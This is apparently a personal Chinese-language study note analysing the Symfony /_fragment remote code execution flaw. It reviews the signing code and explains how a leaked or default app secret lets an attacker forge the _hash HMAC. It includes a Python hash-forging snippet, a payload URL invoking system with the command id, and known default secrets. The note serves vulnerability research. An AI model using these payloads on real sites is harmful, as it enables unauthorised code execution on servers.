---
title: 'Symfony RCE 分析'
date: 2023-04-16 20:09:09
tags: [学习笔记,PHP,漏洞分析]
published: true
hideInList: false
feature: 
isTop: false
---
笔记与总结，笔记/参考见文末。阅读exp代码的心得忽略。

## 概括

Symfony framwork为一个PHP application，并且用于许多知名CMS中，包括Drupal，Joomla!,eZPlatform,Bolt并且经常用于自定义网站。
当访问 /_fragment 的时候，构造特定payload会产生RCE。关键在于请求用HMAC进行加密，其加密密钥被存储在synfony配置下的secret值中（可被破解），其中破解方式包括：尝试默认值，离线暴力破解，简单绕过安全检查。

> This is mainly due to not putting enough emphasis on its importance in the documentation or installation guides.

## 版本差异

1. `Symfony < 4`: 会在请求 `/_fragment` 前，访问 `/_internal` , `/_proxy` （关联CVE：CVE-2012-6432, CVE-2014-5245,CVE-2015-4050）
  
2. `>4` : 安装时会生成secret，并且 `/_fragment` 默认禁止访问。
  

漏洞挖掘两个思路：一个是注意探测同时采用weak的 `secret` 和可访问的 `/_fragment` ，另一个是通过其他已知漏洞获取 `secret` 然后访问`/_fragment`

## 代码分析

### 漏洞产生点：

```php
# ./vendor/symfony/http-kernel/EventListener/FragmentListener.php

class FragmentListener implements EventSubscriberInterface
{
    public function onKernelRequest(RequestEvent $event)
    {
        $request = $event->getRequest();

        # [1]
        if ($this->fragmentPath !== rawurldecode($request->getPathInfo())) {
            return;
        }

        if ($request->attributes->has('_controller')) {
            // Is a sub-request: no need to parse _path but it should still be removed from query parameters as below.
            $request->query->remove('_path');

            return;
        }

        # [2]
        if ($event->isMasterRequest()) {
            $this->validateRequest($request);
        }

        # [3]
        parse_str($request->query->get('_path', ''), $attributes);
        $request->attributes->add($attributes);
        $request->attributes->set('_route_params', array_replace($request->attributes->get('_route_params', []), $attributes));
        $request->query->remove('_path');
    }
}
```

前提提要：

1. `FragmentListener:onKernelRequest`会伴随每个请求运行
  
2. 一些内部变量由Symfony维护而不是用户定义，其中之一就是 `_controller` (决定Symfony来调度哪个控制器)
  
3. 开头不以 `_` 的名字是被送入控制器的参数
  

然后看上面代码，在**检验请求有效性**后（ `this->validateRequest(request); )` 将urldecode的 `_path` 放入 `$attributes` 变量中。

`_path` 举例：

```
/_fragment?_path=_controller%3DSomeClass%253A%253AsomeMethod%26firstMethodParam%3Dtest1%26secondMethodParam%3Dtest2&_hash=...
```

还原后：

```
_controller=SomeClass::someMethod&firstMethodParam=test1&secondMethodParam=test2
```

这里的SomeClass::someMethod可以替换成其它命令。

注意 `_path`下的 `_hash`,后续会针对该值进行验证。

### 校验请求：`$this->validateRequest`

这里的 `$this->validateRequest` 会从两个方面校验 `$request` :

- 请求方式是否安全：`$request->isMethodSafe()`
  
- 请求是否签名（Signed）：`$this->signer->checkRequest($request)`
  

以上二者有校验失败时，均会抛出 `AccessDeniedHttpException` 异常

检查签名的涉及代码

```php
class UriSigner
{
    public function checkRequest(Request $request): bool
    {
        $qs = ($qs = $request->server->get('QUERY_STRING')) ? '?'.$qs : '';

        // we cannot use $request->getUri() here as we want to work with the original URI (no query string reordering)
        return $this->check($request->getSchemeAndHttpHost().$request->getBaseUrl().$request->getPathInfo().$qs);
    }

    /**
     * Checks that a URI contains the correct hash.
     *
     * @return bool True if the URI is signed correctly, false otherwise
     */
    public function check(string $uri)
    {
        $url = parse_url($uri);
        if (isset($url['query'])) {
            parse_str($url['query'], $params);
        } else {
            $params = [];
        }

        if (empty($params[$this->parameter])) {
            return false;
        }

        $hash = $params[$this->parameter];
        unset($params[$this->parameter]);

        # [2]
        return hash_equals($this->computeHash($this->buildUrl($url, $params)), $hash);
    }

    private function computeHash(string $uri): string
    {
        # [1]
        return base64_encode(hash_hmac('sha256', $uri, $this->secret, true));
    }

    private function buildUrl(array $url, array $params = []): string
    {
        ksort($params, SORT_STRING);
        $url['query'] = http_build_query($params, '', '&');

        $scheme = isset($url['scheme']) ? $url['scheme'].'://' : '';
        $host = isset($url['host']) ? $url['host'] : '';
        $port = isset($url['port']) ? ':'.$url['port'] : '';
        $user = isset($url['user']) ? $url['user'] : '';
        $pass = isset($url['pass']) ? ':'.$url['pass'] : '';
        $pass = ($user || $pass) ? "$pass@" : '';
        $path = isset($url['path']) ? $url['path'] : '';
        $query = isset($url['query']) && $url['query'] ? '?'.$url['query'] : '';
        $fragment = isset($url['fragment']) ? '#'.$url['fragment'] : '';

        return $scheme.$user.$pass.$host.$port.$path.$query.$fragment;
    }
}
```

在 `check` 里，会返回字符串比较的结果( `hash_equal` ) ，而这里比较的对象为 `$this->computeHash` 的结果（传入参数为：用`buildUrl` 将传入参数后的 `$url` 重构/reconstructs输出后的结果）与 `$hash = params[$this->parameter];` 下的已有的 `$hash` 进行比较

P.S 这里的URL参数为 `_hash` GET parameter

```php
return hash_equals($this->computeHash($this->buildUrl($url, $params)), $hash);
```

而 `computeHash` 本身是base64编码了经由 `hash_hmac`方法生成的散列值（算法sha256,密钥为 `$this->secret`

```php
    private function computeHash(string $uri): string
    {
        # [1]
        return base64_encode(hash_hmac('sha256', $uri, $this->secret, true));
    }
```

所以正常情况下，`_hash` 对应的值的生成逻辑如下（假设这里的APP_SECRET为正确的secret）- 前提是知道secret：

```python
import base64, hmac, hashlib
print(base64.b64encode(hmac.HMAC(b'{{APP_SECRET}}', b'http://localhost:8000/_fragment', hashlib.sha256).digest()))
# 假设Return : b'lNweS5nNP8QCtMqyqrW8HIl4j9JXIfscGeRm/cmFOh8='
```

然后访问url： `http://localhost:8000/_fragment?_hash=lNweS5nNP8QCtMqyqrW8HIl4j9JXIfscGeRm/cmFOh8=` 会发现原本403的网页变为404 （ 因为没有其他指定请求属性，无法找到Controller）

如果要设置 `system($command)` 则如下：

```txt
 page="http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull"
```

此时返回 `500` 并且显示代码执行成功。

## secret

secret是什么？它是一个字符串，它用于Symfony框架的一些加密和验证操作，如创建cookie或防止CSRF的令牌。秘密值应该是随机生成的，并且不应该被泄露给任何人

获取secret的方式有以下几种

- 读取文件
  
  - `app/config/parameters.yml`
    
  - `.env`
    
- phpinfo
  
  - `$server['APP_SECRET']`
- SSRF / IP spoofing (CVE-2014-5245) ： < 2.5.3, 请求来自于受信任的代理，会被认为是安全的而无需secret
  
- 默认值/常见值: `ThisTokenIsNotSoSecretChangeIt` （更多参考[symfony-exploits/secret_fragment_exploit.py at main · ambionics/symfony-exploits · GitHub](https://github.com/ambionics/symfony-exploits/blob/main/secret_fragment_exploit.py) 下给出的一些常见secret）
  
- Bruteforce:
  
  - 可行性：
    
    1.   一些人喜欢用特定密码
      
    2. secret也用于csrf加密
      

## exp编写

参考github上的 ：[symfony-exploits/secret_fragment_exploit.py at main · ambionics/symfony-exploits · GitHub](https://github.com/ambionics/symfony-exploits/blob/main/secret_fragment_exploit.py)

重要的几点：

1. HMAC计算是用的 **full url**, 如果服务器使用了反向代理，则需要内部URL（internel URL），并且internel可能是HTTP协议而不是HTTPS
  
2. HMAC历史版本加密方式为SHA-1,现在是SHA-256
  

还有就是检测的方式为：无效hash访问 `_/fragment` 返回403,有效则返回500

## Reference

- https://www.ambionics.io/blog/symfony-secret-fragment
- [symfony-exploits/secret_fragment_exploit.py at main · ambionics/symfony-exploits · GitHub](https://github.com/ambionics/symfony-exploits/blob/main/secret_fragment_exploit.py)